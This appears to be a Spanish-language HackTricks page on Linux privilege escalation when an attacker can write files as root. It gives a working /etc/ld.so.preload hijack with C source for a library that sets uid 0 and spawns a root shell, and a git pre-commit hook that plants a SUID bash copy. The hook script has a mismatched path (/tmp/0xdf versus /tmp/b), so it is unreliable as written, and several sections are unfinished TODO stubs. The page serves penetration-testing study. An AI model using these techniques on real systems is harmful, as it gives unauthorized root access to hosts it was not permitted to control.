# Escritura Arbitraria de Archivos en Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Este archivo se comporta como la variable de entorno **`LD_PRELOAD`**, pero también funciona en **binarios SUID**.\
Si puedes crearlo o modificarlo, simplemente puedes agregar una **ruta a una biblioteca que se cargará** con cada binario ejecutado.

Por ejemplo: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) son **scripts** que se **ejecutan** en varios **eventos** en un repositorio git, como cuando se crea un commit, un merge... Así que si un **script o usuario privilegiado** está realizando estas acciones con frecuencia y es posible **escribir en la carpeta `.git`**, esto se puede utilizar para **privesc**.

Por ejemplo, es posible **generar un script** en un repositorio git en **`.git/hooks`** para que se ejecute siempre que se crea un nuevo commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### binfmt_misc

El archivo ubicado en `/proc/sys/fs/binfmt_misc` indica qué binario debe ejecutar qué tipo de archivos. TODO: verifica los requisitos para abusar de esto para ejecutar un rev shell cuando se abre un tipo de archivo común.

{{#include ../../banners/hacktricks-training.md}}
